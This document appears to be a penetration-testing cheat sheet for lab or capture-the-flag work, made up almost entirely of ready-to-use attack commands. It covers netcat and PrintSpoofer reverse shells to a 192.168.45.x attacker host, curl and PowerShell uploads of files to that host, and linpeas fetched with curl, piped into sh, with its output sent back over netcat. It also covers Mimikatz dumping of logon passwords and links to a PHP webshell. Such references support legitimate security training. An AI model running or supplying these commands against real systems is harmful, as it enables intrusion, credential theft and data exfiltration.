Useful Quick Commands - Linux

```bash
# Find folders where the user has write permission
find /home -type d -writable -user $(whoami)
# Find flags
find / -name "flag.txt" -print -quit 2>/dev/null
find / -type f \( -name "local.txt" -o -name "proof.txt" -o -name "user.txt" -o -name "root.txt" -o -name "flag.txt" \) -print -quit 2>/dev/null
# Linux - Find files containing keyword
find '/var/www' -type f -exec grep -l 'password' {} + 2>/dev/null
grep -rnw '/home/svc' -e 'password' 2>/dev/null
```

Useful Quick Commands - Windows

```bash
# Windows runas command
runas /user:backupadmin cmd
```

Stabilize reverse shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
stty raw -echo; fg
export TERM=xterm
```

# Web

## Directory Traversal

https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content

Commonly Used Dictionaries

```
# web/common.txt - 4743 Lines
https://raw.githubusercontent.com/voidexec/sec/main/web/common.txt

# web/big.txt - 20476 lines
https://raw.githubusercontent.com/voidexec/sec/main/web/big.txt

# web/directory-list-2.3-small.txt - 87664 lines
https://raw.githubusercontent.com/voidexec/sec/main/web/directory-list-2.3-small.txt

# web/directory-list-2.3-medium.txt - 220559 lines
https://raw.githubusercontent.com/voidexec/sec/main/web/directory-list-2.3-medium.txt

# web/directory-list-2.3-big.txt - 1273832 lines
https://raw.githubusercontent.com/voidexec/sec/main/web/directory-list-2.3-big.txt
```

## HTTP Server for Upload and Download

```
# Download
https://raw.githubusercontent.com/voidexec/sec/main/web/httpserver.py

# Start Server
python3 httpserver.py (default port 80)
python3 httpserver.py -p 8000

# Upload file with curl
curl -F 'file=@/home/ubuntu/Desktop/flag.txt' http://192.168.45.145/

# Download file with curl
curl -O http://192.168.45.145/linpeas.sh

# Upload with PowerShell
Add-Type -AssemblyName System.Net.Http; $client = New-Object System.Net.Http.HttpClient; $fs = [System.IO.File]::OpenRead("C:\Users\Public\test.out"); $content = New-Object System.Net.Http.MultipartFormDataContent; $fileContent = New-Object System.Net.Http.StreamContent($fs); $fileContent.Headers.ContentDisposition = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue("form-data"); $fileContent.Headers.ContentDisposition.Name = '"file"'; $fileContent.Headers.ContentDisposition.FileName = '"test.out"'; $content.Add($fileContent); $client.PostAsync("http://192.168.45.199/", $content).Wait(); $client.Dispose()

# Download with PowerShell
iwr -uri "http://192.168.45.145/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"
```

# Shell

Reverse Shell Generator https://www.revshells.com/

```bash
# PHP One-liner webshell
https://raw.githubusercontent.com/voidexec/sec/main/webshells/shell.php
```

# Windows

PrintSpoofer (Abusing `SeImpersonatePrivilege`)

https://github.com/itm4n/PrintSpoofer

```powershell
https://github.com/itm4n/PrintSpoofer/releases
# Usage 1 - Spawning cmd interactive as system
PrintSpoofer64.exe -i -c cmd
# Usage 2 - Launching reverse shell as system
PrintSpoofer64.exe -c "C:\Users\Public\nc64.exe 192.168.45.145 9001 -e powershell"
```

NC

https://github.com/int0x33/nc.exe/

```powershell
https://github.com/int0x33/nc.exe/
# nc64.exe
https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe
# Reverse shell
nc64.exe 192.168.45.145 9001 -e powershell
```

Mimikatz

https://github.com/ParrotSec/mimikatz

```powershell
https://raw.githubusercontent.com/ParrotSec/mimikatz/refs/heads/master/x64/mimikatz.exe
# Usage
privilege::debug
sekurlsa::logonpasswords full
```

# Linux

```powershell
https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out # attacker
curl http://192.168.45.145/linpeas.sh | sh | nc 192.168.45.145 9002 # victim
```
